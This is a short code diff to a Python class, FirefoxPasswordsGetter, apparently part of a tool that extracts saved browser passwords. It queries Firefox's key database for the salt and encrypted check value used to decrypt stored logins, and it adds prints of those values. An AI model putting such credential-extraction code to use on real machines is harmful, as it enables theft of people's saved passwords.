@@ -168,8 +168,11 @@ class FirefoxPasswordsGetter(BrowserPasswordsGetter):
 
 
 
-            salt, item2= self.__ExecuteSQLQuery(keyDbPath, "SELECT item1, item2 FROM metadata WHERE id = 'password'");
+            salt, item2= self.__ExecuteSQLQuery(keyDbPath, "SELECT item1, item2 FROM metadata WHERE id = 'password';");
 
+
+            print(f"Item1 (salt): {salt}");
+            print(f"Item2 (Contraseña Base): {item2}");
             
             return salt, item2, loginsFilePath;
             
